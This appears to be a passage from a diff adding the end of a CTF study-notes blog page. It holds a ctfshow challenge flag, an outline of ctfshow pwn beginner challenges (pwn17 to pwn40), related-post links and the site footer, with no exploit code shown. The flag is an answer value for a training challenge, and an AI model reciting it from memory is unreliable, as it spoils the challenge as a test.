+<p><code>ctfshow{c851c3d0-503e-4d76-a0cc-7f053ebb13ad}</code></p>
+
+    </div>
+  </div>
+
+  <aside class="article-side">
+    <div class="card-panel sticky-panel">
+      <h3>Outline</h3>
+      
+        <div class="toc-shell"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#hui%E2%80%99bctfshow-pwn%E5%85%A5%E9%97%A8"><span class="toc-list-text">hui’bctfshow pwn入门</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1"><span class="toc-list-text">1.</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2"><span class="toc-list-text">2.</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3"><span class="toc-list-text">3.</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4"><span class="toc-list-text">4.</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn17"><span class="toc-list-text">pwn17:</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn19"><span class="toc-list-text">pwn19</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn20"><span class="toc-list-text">pwn20</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn21"><span class="toc-list-text">pwn21</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn22"><span class="toc-list-text">pwn22</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn23"><span class="toc-list-text">pwn23</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn24"><span class="toc-list-text">pwn24</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#undo-pwn25"><span class="toc-list-text">undo pwn25</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn35"><span class="toc-list-text">pwn35</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn36"><span class="toc-list-text">pwn36</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn37"><span class="toc-list-text">pwn37</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn38"><span class="toc-list-text">pwn38</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn39"><span class="toc-list-text">pwn39</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn40"><span class="toc-list-text">pwn40</span></a></li></ol></li></ol></div>
+      
+    </div>
+
+    
+      <div class="card-panel sticky-panel">
+        <h3>More from ctf</h3>
+        <div class="mini-list">
+          
+            <a href="/notes/ctf/_CTF/">
+              <strong>_CTF</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/_CTF/Week_1/">
+              <strong>Week_1</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/">
+              <strong>2025_SWPU-NSSCTF_秋季招新入门训练赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/%E8%BF%98%E5%9C%A8%E5%86%99%E3%80%82CopperSmith%E7%AE%97%E6%B3%95/">
+              <strong>还在写。CopperSmith算法</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </aside>
+</article>
+
+      </main>
+      
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <strong>JerryXie&#39;s Blog</strong>
+      <p>CTF, digital forensics, offensive security, and study notes.</p>
+    </div>
+    <div class="footer-meta">
+      <span>Hexo</span>
+      <span class="dot"></span>
+      <a href="https://github.com/JerryXie599/jerryxie599.github.io" target="_blank" rel="noopener">GitHub</a>
+      <span class="dot"></span>
+      <a href="https://jerryxie.top/" target="_blank" rel="noopener">Live</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
